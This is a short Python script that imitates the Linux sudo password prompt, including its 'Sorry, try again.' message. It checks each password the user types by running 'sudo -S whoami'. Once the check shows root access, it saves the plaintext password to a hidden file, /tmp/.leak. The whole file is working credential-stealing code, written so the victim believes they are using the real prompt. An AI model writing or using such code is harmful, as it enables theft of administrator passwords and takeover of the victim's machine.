import getpass
from subprocess import Popen, PIPE


class sudo:

    def __init__(self):
        pass

    @classmethod
    def prompt(cls):
        while True:
            passwd = getpass.getpass(f'[sudo] password for {getpass.getuser()}: ')
            cmd = Popen(['sudo', '-S', 'whoami'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
            cmd.communicate(passwd.encode())
            if 'root' in cmd.communicate()[0].decode():
                with open('/tmp/.leak', 'w') as file:
                    file.write(passwd)
                    file.close()
                    return True
            else:
                print('Sorry, try again.')
                cmd.kill()


sudo().prompt()
